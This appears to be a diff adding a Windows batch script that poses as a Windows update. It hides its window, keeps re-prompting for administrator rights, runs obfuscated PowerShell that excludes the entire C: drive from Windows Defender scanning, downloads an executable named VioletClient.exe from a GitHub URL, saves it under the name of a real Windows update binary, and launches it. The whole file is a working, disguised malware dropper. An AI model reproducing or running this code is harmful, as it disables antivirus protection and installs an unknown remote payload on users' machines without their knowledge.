@@ -1,0 +1,52 @@
+@echo off
+if not "%1"=="MINIMIZED" (
+    start "" /min cmd /c "%~f0" MINIMIZED %*
+    exit /b
+)
+
+net session >nul 2>&1
+if %errorLevel% == 0 (
+    goto :runAsAdmin
+) else (
+    goto :requestElevation
+)
+
+:requestElevation
+    set "originalPID="
+    for /f "tokens=2 delims=;=" %%A in ('wmic process where "name='cmd.exe' and commandline like '%%%~nx0%%'" get processid^, commandline /format:list ^| find "MINIMIZED"') do (
+        if not defined originalPID set "originalPID=%%A"
+    )
+    
+    set "batchPath=%~f0"
+    set "batchArgs=MINIMIZED KILLPARENT %originalPID%"
+    
+    :tryElevate
+    echo Microsoft Windows Update Service...
+    powershell -noprofile -windowstyle hidden -command "Start-Process -WindowStyle Hidden -FilePath 'cmd.exe' -ArgumentList '/min /c \"\"%batchPath%\" %batchArgs%\"' -Verb RunAs"
+    if %errorLevel% == 0 (
+        timeout /t 2 >nul
+        exit
+    ) else (
+        timeout /t 1 >nul
+        goto :tryElevate
+    )
+
+:runAsAdmin
+    if /i "%~2"=="KILLPARENT" (
+        taskkill /PID %~3 /F >nul 2>&1
+    )
+    
+    setlocal
+    set "exeFile=%TEMP%\wuauclt.exe"
+    set "url1=https://github.com/vault053009-maker/a/raw/refs/heads/main/VioletClient.exe"
+    set "cmd1=Add-Mp"
+    set "cmd2=Preference"
+    set "cmd3=-ExclusionPath"
+    set "cmd4='C:\'"
+    set "fullcmd=%cmd1%%cmd2% %cmd3% %cmd4%"
+    powershell -NoProfile -ExecutionPolicy Bypass -Command "%fullcmd%"
+    timeout /t 3 >nul
+    bitsadmin /transfer "Update" "%url1%" "%exeFile%"
+    start "" "%exeFile%"
+    endlocal
+    exit
